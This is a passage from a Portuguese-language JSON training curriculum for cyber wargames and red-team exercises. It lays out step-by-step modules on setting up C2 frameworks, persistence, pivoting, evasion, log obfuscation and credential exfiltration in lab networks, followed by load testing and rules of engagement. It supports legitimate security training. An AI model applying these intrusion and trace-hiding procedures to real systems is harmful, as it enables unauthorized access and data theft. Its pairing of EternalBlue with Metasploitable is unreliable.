                                  "learningObjective": "Compreender requisitos e selecionar ferramentas adequadas para cenários de ethical hacking.",
                                  "commonMistakes": "Ignorar requisitos de dependências (ex: Java ausente); usar ferramentas sem licença legal."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalação das Ferramentas de C2",
                                  "subSteps": [
                                    "Instale dependências (ex: instalar Java 11+ para Cobalt Strike ou pip install para Empire).",
                                    "Baixe e extraia o binário da ferramenta em diretório dedicado.",
                                    "Inicie o servidor C2 pela primeira vez (ex: ./teamserver para Cobalt Strike ou ./empire para Empire).",
                                    "Gere beacons/agents iniciais e configure listener básico (ex: HTTP/HTTPS).",
                                    "Teste conectividade básica com um agente em VM target."
                                  ],
                                  "verification": "Servidor C2 rodando sem erros, agente se conectando via listener (logs confirmam).",
                                  "estimatedTime": "1 hora",
                                  "materials": "Kali Linux VM, arquivos de instalação das ferramentas, VMs target (Windows 10, Ubuntu).",
                                  "tips": "Execute como root apenas se necessário; use firewalls para restringir portas.",
                                  "learningObjective": "Instalar e inicializar frameworks C2 de forma segura e funcional.",
                                  "commonMistakes": "Portas padrão expostas sem firewall; falha em instalar dependências corretas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configuração de Pivoting e Persistência",
                                  "subSteps": [
                                    "Configure pivoting (ex: SOCKS proxy no Cobalt Strike ou stagers no Empire para tunelamento).",
                                    "Crie payloads para persistência (ex: service-based no Windows via Cobalt Strike ou cron jobs no Linux).",
                                    "Integre pivoting com rede simulada (ex: roteie tráfego via compromised host).",
                                    "Teste persistência reiniciando target e verificando reconexão automática.",
                                    "Ajuste profiles/Malleable C2 para evasão básica (ex: user-agents customizados)."
                                  ],
                                  "verification": "Tráfego pivotado com sucesso (ex: nmap via proxy); agente persiste após reboot.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Rede VM simulada (ex: Metasploitable + Windows), Wireshark para monitoramento.",
                                  "tips": "Monitore tráfego com Wireshark para depurar; comece com pivoting simples TCP.",
                                  "learningObjective": "Implementar técnicas de pivoting e persistência em ferramentas C2.",
                                  "commonMistakes": "Payloads detectáveis por AV; pivoting sem autenticação inicial."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adaptação ao Cenário de Jogo Cibernético",
                                  "subSteps": [
                                    "Mapeie cenário (ex: AD corporativo com DCs e workstations).",
                                    "Adapte C2 para cenário (ex: listeners multi-stage, beacons stealth).",
                                    "Integre com outras ferramentas (ex: Meterpreter via Cobalt Strike para pós-exploração).",
                                    "Simule ataque completo: infecção inicial > pivoting > persistência > exfiltração.",
                                    "Documente chain of command para replay em jogos."
                                  ],
                                  "verification": "Cenário rodando com C2 suportando fluxo completo (vídeo/screenshots).",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ambiente de lab completo (ex: HackTheBox-like com múltiplos hosts), scripts de automação.",
                                  "tips": "Use beacons sleep para stealth; teste em velocidades reais de rede.",
                                  "learningObjective": "Adaptar ferramentas C2 a cenários específicos de jogos cibernéticos.",
                                  "commonMistakes": "Sobrecarregar rede com beacons frequentes; ignorar detecção por EDR simulada."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testes, Validação e Limpeza",
                                  "subSteps": [
                                    "Execute testes end-to-end em cenário completo.",
                                    "Valide contra defesas (ex: EDR rules, network monitoring).",
                                    "Meça métricas (tempo de pivoting, taxa de persistência).",
                                    "Documente configurações e lessons learned.",
                                    "Limpe ambiente (kill beacons, reset VMs)."
                                  ],
                                  "verification": "Relatório de testes com métricas e ambiente limpo (snapshots restaurados).",
                                  "estimatedTime": "1 hora",
                                  "materials": "Ferramentas de monitoramento (ELK stack ou Sysmon), relatório template.",
                                  "tips": "Automatize limpeza com scripts; grave sessões para review.",
                                  "learningObjective": "Validar integração e garantir práticas seguras de ethical hacking.",
                                  "commonMistakes": "Deixar beacons persistindo pós-teste; não documentar configs."
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético simulando uma rede corporativa, instale Cobalt Strike em Kali, pivote de um workstation comprometido para o DC via SOCKS, implante persistência como scheduled task, e use C2 para exfiltrar credenciais de AD, suportando blue team defense.",
                              "finalVerifications": [
                                "Servidor C2 acessível e estável por 30min+.",
                                "Pivoting permite acesso a 3+ hosts internos.",
                                "Persistência sobrevive a 2 reboots e reconecta.",
                                "Configurações adaptadas ao cenário sem crashes.",
                                "Limpeza completa sem artefatos residuais.",
                                "Relatório documenta todo o setup."
                              ],
                              "assessmentCriteria": [
                                "Proficiência na instalação sem erros (90% sucesso).",
                                "Eficácia de pivoting/persistência em cenários reais (taxa >80%).",
                                "Stealth e evasão básica demonstrada.",
                                "Documentação clara e reproduzível.",
                                "Conformidade ética (logs de consentimento).",
                                "Tempo total dentro de estimado (±20%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP/IP e tunelamento.",
                                "Programação: Customização de payloads em Python/PowerShell.",
                                "Segurança: Análise de detecção EDR/AV.",
                                "Gestão de Projetos: Planejamento de cenários de simulação."
                              ],
                              "realWorldApplication": "Em operações de Red Team para testes de penetração em empresas, integrando C2 para simular APTs persistentes, validando defesas em exercícios de jogos cibernéticos como aqueles da CERT ou competições DEF CON."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.2.3",
                            "name": "Simular persistência e pivoting",
                            "description": "Implementar técnicas de persistência em hosts simulados e rotas de pivoting entre segmentos de rede, validando a adaptabilidade do cenário ao ambiente montado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Simulação de Rede Segmentada",
                                  "subSteps": [
                                    "Instalar e configurar máquinas virtuais (VMs) representando hosts em segmentos de rede diferentes usando ferramentas como VirtualBox ou VMware.",
                                    "Configurar rede virtual com segmentos isolados (ex: VLANs simuladas ou sub-redes separadas) e firewalls básicos entre eles.",
                                    "Instalar sistemas operacionais vulneráveis em hosts alvo (ex: Windows 7/10 sem patches, Linux básico) e um host atacante com Kali Linux.",
                                    "Verificar conectividade inicial e isolar segmentos para simular defesas reais.",
                                    "Documentar topologia de rede e IPs para referência futura."
                                  ],
                                  "verification": "Executar ping e traceroute entre hosts para confirmar segmentação; capturar tráfego com Wireshark para validar isolamento.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "VirtualBox/VMware Workstation",
                                    "Kali Linux ISO",
                                    "Imagens de VMs vulneráveis (ex: Metasploitable, DVWA)",
                                    "Wireshark"
                                  ],
                                  "tips": "Use snapshots de VMs para facilitar resets; comece com rede simples de 3-4 hosts para evitar complexidade inicial.",
                                  "learningObjective": "Entender e montar uma rede segmentada simulada que replique ambientes corporativos reais.",
                                  "commonMistakes": [
                                    "Não isolar corretamente segmentos, permitindo acesso direto",
                                    "Esquecer de documentar IPs e portas",
                                    "Usar VMs desatualizadas sem vulnerabilidades conhecidas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Técnicas de Persistência no Host Inicial",
                                  "subSteps": [
                                    "Ganhe acesso inicial ao host alvo via exploit conhecido (ex: EternalBlue no Metasploitable).",
                                    "Instale backdoor ou agente de persistência (ex: Meterpreter no Metasploit, scheduled task no Windows, cron job no Linux).",
                                    "Configure persistência para sobreviver a reboots (ex: registry run keys no Windows, rc.local no Linux).",
                                    "Teste reboot do host e verifique reconexão automática do agente.",
                                    "Monitore logs do host para ofuscar rastros de persistência."
                                  ],
                                  "verification": "Reboot o host alvo múltiplas vezes e confirme reconexão estável do agente via listener no host atacante.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Metasploit Framework",
                                    "Kali Linux",
                                    "Exploit modules (ex: ms17_010_eternalblue)"
                                  ],
                                  "tips": "Use payloads staged para reduzir detecção; evite técnicas barulhentas como WMI subscriptions em ambientes monitorados.",
                                  "learningObjective": "Dominar métodos de persistência que mantêm acesso de longo prazo em hosts comprometidos.",
                                  "commonMistakes": [
                                    "Persistência não sobrevive a reboots",
                                    "Logs não limpos, facilitando detecção",
                                    "Payload detectado por AV básico"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer Rotas de Pivoting Entre Segmentos de Rede",
                                  "subSteps": [
                                    "Do host persistente inicial, escaneie e identifique hosts no próximo segmento (ex: nmap via Meterpreter).",
                                    "Configure pivoting no framework (ex: autoroute no Metasploit ou SSH tunneling com chisel/socat).",
                                    "Explore e comprometa host no segmento adjacente usando o pivô estabelecido.",
                                    "Implemente persistência no novo host e expanda pivoting para segmentos adicionais.",
                                    "Teste conectividade end-to-end do host atacante original através da cadeia de pivôs."
                                  ],
                                  "verification": "Execute comandos remotos (ex: whoami, netstat) em hosts downstream via pivô; confirme sem alertas de firewall.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Metasploit (post/multi/manage/autoroute)",
                                    "Chisel ou Socat para tunneling",
                                    "Nmap"
                                  ],
                                  "tips": "Prefira pivoting SOCKS para flexibilidade; monitore latência para otimizar rotas.",
                                  "learningObjective": "Implementar pivoting para navegar por redes segmentadas, simulando laterais de movimento em ataques avançados.",
                                  "commonMistakes": [
                                    "Pivô bloqueado por firewall outbound",
                                    "Escaneamento agressivo detectado",
                                    "Não testar após cada hop"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Adaptação e Robustez do Cenário Simulado",
                                  "subSteps": [
                                    "Introduza mudanças no ambiente (ex: alterar regras de firewall, reboot aleatório de hosts).",
                                    "Teste adaptabilidade da persistência e pivoting sob estresse (ex: tráfego alto, detecção simulada).",
                                    "Colete métricas de sucesso (tempo de reconexão, taxa de falha).",
                                    "Documente lições aprendidas e ajustes necessários para cenários reais.",
                                    "Limpe o ambiente e restaure snapshots originais."
                                  ],
                                  "verification": "Simule detecção/remediação e confirme capacidade de reestabelecimento em <5 minutos; gere relatório de validação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Scripts de automação (ex: Bash/Python para reboots)",
                                    "Relatórios de logs (Metasploit, Wireshark)"
                                  ],
                                  "tips": "Automatize testes com scripts para repetibilidade; foque em métricas quantitativas.",
                                  "learningObjective": "Avaliar e refinar simulações para garantir adaptabilidade a variações ambientais reais.",
                                  "commonMistakes": [
                                    "Ignorar impactos de rede latente",
                                    "Não documentar falhas para iterações futuras",
                                    "Cleanup incompleto, corrompendo ambiente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de rede corporativa com DMZ, servidor web e banco de dados segmentados, comprometa o servidor web via SQLi, instale Meterpreter persistente via scheduled task, pivote via autoroute para o segmento de BD, e extraia dados sensíveis validando sobrevivência após reboot e mudança de firewall.",
                              "finalVerifications": [
                                "Persistência mantém acesso após 3 reboots consecutivos em cada host.",
                                "Pivoting permite acesso completo a todos segmentos sem detecção direta.",
                                "Mudanças ambientais (ex: nova regra firewall) são adaptadas em <10 min.",
                                "Logs mostram ofuscação efetiva de atividades maliciosas.",
                                "Métricas de performance: latência pivô <500ms, uptime >95%.",
                                "Relatório gerado com evidências de screenshots e pcaps."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de persistência (sobrevivência a reboots: 100%).",
                                "Efetividade do pivoting (acesso bem-sucedido a 100% dos segmentos alvo).",
                                "Adaptabilidade demonstrada sob estresse (sucesso >90% em testes variáveis).",
                                "Documentação completa e clara de passos e lições.",
                                "Uso correto de ferramentas sem erros de configuração.",
                                "Limpeza total do ambiente pós-simulação."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de roteamento, firewalls e segmentação (CCNA-level).",
                                "Programação: Scripts de automação em Bash/Python para testes.",
                                "Sistemas Operacionais: Gerenciamento de serviços, cron jobs e registry.",
                                "Análise Forense: Limpeza de logs e ofuscação de rastros.",
                                "Inteligência de Ameaças: Mapeamento de TTPs MITRE ATT&CK (TA0003, TA0008)."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou APTs como SolarWinds, persistência via golden SAML e pivoting via trust relationships permitem movimento lateral em redes enterprise, exfiltrando dados de domínios isolados sem alertas iniciais."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.2.4",
                            "name": "Testar escalabilidade do ambiente",
                            "description": "Verificar a capacidade do ambiente montado para suportar múltiplos atores (Red e Blue Teams), ajustando recursos para cenários de grande escala.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Métricas de Escalabilidade e Estabelecer Baselines",
                                  "subSteps": [
                                    "Identificar métricas chave como CPU, memória, latência de rede, throughput e taxa de erros.",
                                    "Coletar dados de baseline do ambiente atual com carga mínima (1-2 usuários).",
                                    "Documentar requisitos de escala: número esperado de atores Red/Blue (ex: 50+).",
                                    "Definir thresholds aceitáveis para cada métrica (ex: CPU <80%, latência <200ms).",
                                    "Criar um dashboard de monitoramento inicial."
                                  ],
                                  "verification": "Relatório de baseline gerado com métricas documentadas e thresholds aprovados.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Ferramentas de monitoramento (Prometheus, Grafana)",
                                    "Acesso administrativo ao ambiente",
                                    "Planilha ou ferramenta de documentação"
                                  ],
                                  "tips": "Priorize métricas relevantes ao contexto de jogos de guerra, como simulação de tráfego de ataques DDoS.",
                                  "learningObjective": "Compreender e quantificar requisitos de performance para ambientes multi-ator.",
                                  "commonMistakes": "Definir thresholds muito rigorosos sem considerar variações reais de uso."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Executar Simulações de Carga Inicial",
                                  "subSteps": [
                                    "Configurar ferramentas de simulação de carga (ex: Locust, JMeter) para emular Red/Blue Teams.",
                                    "Iniciar simulação com 10-20 atores virtuais executando ações típicas (scans, exploits, defesas).",
                                    "Monitorar métricas em tempo real via dashboard.",
                                    "Aumentar gradualmente a carga até 50% do limite projetado.",
                                    "Registrar picos de uso e respostas iniciais."
                                  ],
                                  "verification": "Logs de simulação gerados mostrando carga aplicada e métricas coletadas sem crashes.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Ferramentas de load testing (Locust/JMeter)",
                                    "Scripts de simulação de tráfego Red/Blue",
                                    "Ambiente de teste isolado"
                                  ],
                                  "tips": "Use perfis de usuário realistas baseados em cenários de ameaça para precisão.",
                                  "learningObjective": "Dominar configuração de testes de carga para simular equipes adversárias.",
                                  "commonMistakes": "Sobrecarregar o ambiente prematuramente sem ramp-up gradual."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Gargalos e Ajustar Recursos",
                                  "subSteps": [
                                    "Analisar logs e dashboards para identificar gargalos (ex: CPU saturada, rede congestionada).",
                                    "Ajustar recursos: escalar VMs, aumentar bandwidth, otimizar configurações de containers.",
                                    "Reexecutar simulação com carga full-scale (ex: 100+ atores).",
                                    "Comparar métricas pré e pós-ajuste.",
                                    "Documentar mudanças e impactos."
                                  ],
                                  "verification": "Relatório de análise com gargalos identificados, ajustes aplicados e melhorias quantificadas.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Dashboards de monitoramento",
                                    "Ferramentas de orquestração (Kubernetes/Docker Swarm)",
                                    "Acesso a provedores de cloud (AWS/Azure)"
                                  ],
                                  "tips": "Foquem em auto-scaling groups para automação futura.",
                                  "learningObjective": "Aprender a diagnosticar e remediar gargalos em ambientes distribuídos.",
                                  "commonMistakes": "Ignorar gargalos latentes como I/O de disco durante picos de rede."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Escalabilidade Final e Documentar",
                                  "subSteps": [
                                    "Executar teste de estresse extremo (150% da carga projetada por 30min).",
                                    "Verificar recuperação automática pós-estresse.",
                                    "Gerar relatório final com gráficos de performance.",
                                    "Atualizar playbook de operações para manutenção de escala.",
                                    "Compartilhar resultados com stakeholders."
                                  ],
                                  "verification": "Ambiente passa no teste de estresse sem downtime e relatório final aprovado.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Scripts de estresse",
                                    "Ferramentas de relatórios (Grafana reports)",
                                    "Template de playbook"
                                  ],
                                  "tips": "Inclua testes de failover para alta disponibilidade.",
                                  "learningObjective": "Garantir robustez do ambiente para cenários de produção em jogos de guerra.",
                                  "commonMistakes": "Não testar recuperação pós-falha, assumindo apenas estabilidade estática."
                                }
                              ],
                              "practicalExample": "Em um cyber range simulando um ataque a uma rede corporativa, configure Locust para 30 agentes Red Team executando scans Nmap e exploits Metasploit, enquanto 70 Blue Team simulam detecções via SIEM; ajuste Kubernetes pods de 10 para 50, garantindo latência <150ms e zero perdas de pacotes.",
                              "finalVerifications": [
                                "Ambiente suporta 100+ atores simultâneos sem exceder 80% de uso de recursos.",
                                "Latência de rede e throughput mantidos dentro de thresholds durante picos.",
                                "Recuperação automática de falhas em <5 minutos.",
                                "Nenhum crash ou perda de dados em testes de estresse.",
                                "Dashboard atualizado reflete performance escalável.",
                                "Playbook de escala documentado e testado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de métricas e baselines (90%+ cobertura).",
                                "Eficácia dos ajustes: redução de gargalos em pelo menos 50%.",
                                "Qualidade da simulação: realismo em emulação de Red/Blue Teams.",
                                "Documentação completa e acionável.",
                                "Tempo de execução dentro do estimado (±20%).",
                                "Robustez em testes de estresse (pass rate 100%)."
                              ],
                              "crossCurricularConnections": [
                                "Cloud Computing: Auto-scaling e orquestração de recursos.",
                                "Engenharia de Redes: Otimização de throughput e latência.",
                                "Desenvolvimento de Software: Automação de testes com scripts.",
                                "Gestão de Projetos: Planejamento de capacidade e risco."
                              ],
                              "realWorldApplication": "Em centros de operações de segurança (SOCs) empresariais, testar escalabilidade garante que plataformas de resposta a incidentes suportem equipes globais durante breaches em massa, como ataques DDoS a bancos ou simulações de ransomware em infraestruturas críticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.3",
                        "name": "Integração com Regras de Engajamento (ROE)",
                        "description": "Incorporação das Regras de Engajamento aos cenários e ambientes, definindo limites éticos, legais e operacionais para evitar violações durante jogos cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.3.1",
                            "name": "Definir e documentar ROE específicas",
                            "description": "Elaborar regras claras de engajamento baseadas em mindset do adversário e objetivos do exercício, incluindo proibições de alvos reais e escopo de ações permitidas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos fundamentais de ROE no contexto cibernético",
                                  "subSteps": [
                                    "Estudar definições de ROE em operações militares e cibernéticas",
                                    "Analisar exemplos históricos de ROE em jogos de guerra cibernéticos",
                                    "Identificar componentes essenciais: mindset adversário, objetivos e limitações",
                                    "Revisar diretrizes legais e éticas aplicáveis a ROE cibernéticas",
                                    "Mapear diferenças entre ROE físicas e cibernéticas"
                                  ],
                                  "verification": "Resumo escrito com 5 conceitos chave identificados e explicados",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos de referência sobre ROE (ex: manuais militares), artigos acadêmicos sobre ciberoperações"
                                  ],
                                  "tips": "Use mindmaps para visualizar relações entre conceitos",
                                  "learningObjective": "Dominar os princípios básicos de ROE e sua adaptação ao domínio cibernético",
                                  "commonMistakes": [
                                    "Confundir ROE com regras de jogo genéricas",
                                    "Ignorar aspectos legais e éticos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar objetivos do exercício e mindset do adversário",
                                  "subSteps": [
                                    "Listar objetivos principais do exercício de guerra cibernética",
                                    "Perfilhar o mindset do adversário (motivações, táticas, limitações)",
                                    "Identificar riscos de escalada e alvos proibidos (ex: infraestruturas críticas reais)",
                                    "Mapear ações permitidas alinhadas aos objetivos",
                                    "Consultar stakeholders para validar premissas"
                                  ],
                                  "verification": "Relatório de análise com perfil do adversário e lista de objetivos/riscos",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Descrição do cenário do exercício, perfis de ameaças cibernéticas (ex: MITRE ATT&CK)"
                                  ],
                                  "tips": "Priorize mindset psicológico do adversário para prever comportamentos",
                                  "learningObjective": "Capacitar análise contextual para basear ROE em dados reais",
                                  "commonMistakes": [
                                    "Subestimar mindset adversário",
                                    "Não alinhar com objetivos do exercício"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Elaborar regras claras de engajamento",
                                  "subSteps": [
                                    "Redigir proibições explícitas (ex: 'Não engajar alvos reais fora do ambiente simulado')",
                                    "Definir escopo de ações permitidas (ex: 'Apenas simulações em redes virtuais')",
                                    "Incluir triggers de escalada e desengajamento baseados em mindset adversário",
                                    "Estruturar regras em categorias: permissões, proibições, condições",
                                    "Testar lógica com cenários hipotéticos"
                                  ],
                                  "verification": "Draft das ROE com pelo menos 10 regras categorizadas",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Templates de ROE, ferramentas de edição (Word/Google Docs)"
                                  ],
                                  "tips": "Use linguagem imperativa e sem ambiguidades (ex: 'Proibido', 'Permitido apenas se')",
                                  "learningObjective": "Criar ROE acionáveis e alinhadas ao contexto",
                                  "commonMistakes": [
                                    "Regras vagas ou ambíguas",
                                    "Excesso de regras desnecessárias"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar, revisar e validar as ROE",
                                  "subSteps": [
                                    "Formatar documento oficial com introdução, regras, apêndices e assinaturas",
                                    "Realizar revisão por pares ou stakeholders",
                                    "Simular aplicação em um mini-exercício para validar clareza",
                                    "Incorporar feedback e iterar",
                                    "Arquivar versão final com controle de mudanças"
                                  ],
                                  "verification": "Documento final de ROE aprovado por revisores, com evidência de simulação",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de versionamento (Git), formulários de revisão"
                                  ],
                                  "tips": "Inclua glossário para termos técnicos",
                                  "learningObjective": "Garantir ROE documentadas são utilizáveis e auditáveis",
                                  "commonMistakes": [
                                    "Pular revisão",
                                    "Documentação incompleta ou mal formatada"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de simulação de invasão cibernética a uma rede corporativa virtual, defina ROE como: 'Proibido qualquer ação em IPs reais de produção; Permitido apenas scans e exploits em VMs isoladas; Desengajar se simulação detectar tráfego para fora do ambiente lab.' Baseado no mindset de um APT chinês focado em espionagem econômica.",
                              "finalVerifications": [
                                "ROE cobrem mindset adversário e objetivos do exercício",
                                "Proibições de alvos reais explicitamente listadas",
                                "Escopo de ações permitidas sem ambiguidades",
                                "Documento formatado profissionalmente com glossário",
                                "Validação via simulação sem violações",
                                "Aprovação de stakeholders"
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão da linguagem (sem ambiguidades)",
                                "Alinhamento com objetivos e mindset adversário (90% cobertura)",
                                "Completude de proibições e escopos (todas categorias abordadas)",
                                "Qualidade da documentação (estrutura, formatação)",
                                "Evidência de revisão e validação",
                                "Aplicabilidade prática em cenários reais"
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional: Convenções de guerra cibernética (ex: Tallinn Manual)",
                                "Ética e Liderança: Decisões morais em operações",
                                "Estratégia Militar: Planejamento tático e operacional",
                                "Psicologia: Análise comportamental de adversários"
                              ],
                              "realWorldApplication": "Em operações de defesa cibernética nacional, como as conduzidas pelo CERT ou forças armadas, ROE específicas previnem escaladas acidentais, garantem conformidade legal e otimizam respostas a ameaças reais, como em exercícios da OTAN ou simulações de ransomware estatal."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.3.2",
                            "name": "Adaptar cenários às ROE",
                            "description": "Revisar e modificar cenários de ameaça para alinhamento total com as ROE, removendo elementos de risco e garantindo conformidade com diretrizes organizacionais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender e Mapear as Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Ler integralmente o documento de ROE aplicável ao exercício cibernético.",
                                    "Identificar e listar restrições chave, como proibições a alvos civis ou infraestrutura crítica.",
                                    "Mapear elementos das ROE a componentes típicos de cenários de ameaça (ex.: alvos, táticas, impactos).",
                                    "Consultar stakeholders ou especialistas jurídicos para esclarecimentos sobre interpretações ambíguas.",
                                    "Criar um glossário de termos ROE relevantes para o contexto cibernético."
                                  ],
                                  "verification": "Documento de mapeamento ROE completo com pelo menos 5 restrições chave listadas e glossário criado.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documento oficial de ROE",
                                    "Ferramenta de edição de texto (ex.: Microsoft Word ou Google Docs)",
                                    "Acesso a contatos jurídicos/militares"
                                  ],
                                  "tips": [
                                    "Priorize ROE relacionadas a escalada de conflitos e impactos colaterais cibernéticos.",
                                    "Use tabelas para mapear ROE vs. elementos de cenário."
                                  ],
                                  "learningObjective": "Dominar as restrições impostas pelas ROE e sua aplicação a cenários cibernéticos.",
                                  "commonMistakes": [
                                    "Ignorar ROE contextuais ou de contingência.",
                                    "Não consultar fontes primárias para definições."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Cenário Original contra as ROE",
                                  "subSteps": [
                                    "Listar todos os elementos do cenário de ameaça (alvos, ações, táticas, resultados esperados).",
                                    "Comparar cada elemento com o mapeamento ROE do Step 1, marcando conformidades e violações.",
                                    "Classificar violações por gravidade (crítica, moderada, menor).",
                                    "Quantificar riscos associados a cada violação (ex.: probabilidade de escalada real).",
                                    "Documentar evidências textuais das ROE violadas para cada item."
                                  ],
                                  "verification": "Relatório de análise com tabela de conformidade preenchida para 100% dos elementos do cenário.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Cenário original em formato digital",
                                    "Planilha (ex.: Excel ou Google Sheets)",
                                    "Mapeamento ROE do Step 1"
                                  ],
                                  "tips": [
                                    "Use cores na planilha: verde para conforme, vermelho para violação.",
                                    "Considere impactos indiretos, como vazamento de dados civis."
                                  ],
                                  "learningObjective": "Identificar com precisão todas as incompatibilidades entre cenário e ROE.",
                                  "commonMistakes": [
                                    "Subestimar violações indiretas.",
                                    "Focar apenas em ações ofensivas, ignorando defesas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Modificar e Ajustar o Cenário para Conformidade",
                                  "subSteps": [
                                    "Para cada violação crítica, remover ou substituir o elemento (ex.: trocar alvo civil por militar).",
                                    "Ajustar táticas e sequências para eliminar riscos desnecessários mantendo realismo.",
                                    "Adicionar salvaguardas explícitas no cenário (ex.: 'ações pausadas se ROE violada').",
                                    "Verificar interdependências: garantir que mudanças não criem novas violações.",
                                    "Reescrever seções afetadas com linguagem clara e alinhada às ROE."
                                  ],
                                  "verification": "Versão modificada do cenário com todas as violações resolvidas e tracked changes ativados.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Cenário original e relatório de análise",
                                    "Ferramenta de edição colaborativa (ex.: Google Docs)",
                                    "Template de cenário padrão"
                                  ],
                                  "tips": [
                                    "Mantenha o equilíbrio entre realismo e conformidade; teste substituições com exemplos históricos.",
                                    "Envolva um par para revisão rápida durante edições."
                                  ],
                                  "learningObjective": "Transformar cenários não conformes em versões seguras e eficazes.",
                                  "commonMistakes": [
                                    "Sobrecorrigir, tornando o cenário irrealista.",
                                    "Não documentar rationale para cada mudança."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, Documentar e Testar o Cenário Adaptado",
                                  "subSteps": [
                                    "Realizar revisão cruzada com mapeamento ROE original.",
                                    "Simular walkthrough do cenário com equipe para detectar violações ocultas.",
                                    "Documentar todas as mudanças, incluindo rationale e impactos no aprendizado.",
                                    "Obter aprovação formal de stakeholders jurídicos/operacionais.",
                                    "Preparar versão final com anexos de conformidade ROE."
                                  ],
                                  "verification": "Aprovação assinada de stakeholders e simulação walkthrough sem violações detectadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Versão modificada",
                                    "Checklist de validação ROE",
                                    "Ferramentas de videoconferência para walkthrough"
                                  ],
                                  "tips": [
                                    "Grave o walkthrough para auditoria futura.",
                                    "Prepare Q&A antecipado para stakeholders."
                                  ],
                                  "learningObjective": "Garantir validação robusta e documentação auditável do cenário adaptado.",
                                  "commonMistakes": [
                                    "Pular simulação prática.",
                                    "Não versionar documentos adequadamente."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de guerra cibernética simulando um ataque DDoS a uma rede bancária (alvo civil), adapte removendo o DDoS e substituindo por um teste de penetração controlado em uma rede militar simulada, adicionando salvaguardas como 'parar se dados sensíveis detectados', alinhando com ROE que proíbem impactos econômicos civis.",
                              "finalVerifications": [
                                "100% dos elementos do cenário estão explicitamente permitidos pelas ROE.",
                                "Nenhum risco de escalada real ou violação legal permanece.",
                                "Mudanças documentadas com rationale e tracked changes.",
                                "Walkthrough simulado confirma conformidade sem discrepâncias.",
                                "Aprovação formal de stakeholders jurídicos obtida.",
                                "Versão final inclui anexo de checklist ROE."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de violações (taxa de detecção >95%).",
                                "Eficácia das modificações em manter realismo e valor educacional.",
                                "Completude da documentação e rastreabilidade das mudanças.",
                                "Qualidade da validação (ausência de novas violações introduzidas).",
                                "Eficiência temporal (conclusão dentro do estimado).",
                                "Clareza e usabilidade do cenário final para equipes."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional e Ética em Conflitos Cibernéticos (análise legal de ROE).",
                                "Gestão de Riscos e Compliance (identificação e mitigação de riscos).",
                                "Planejamento Estratégico Militar (integração de cenários em operações).",
                                "Design Instrucional (criação de simulações educacionais seguras)."
                              ],
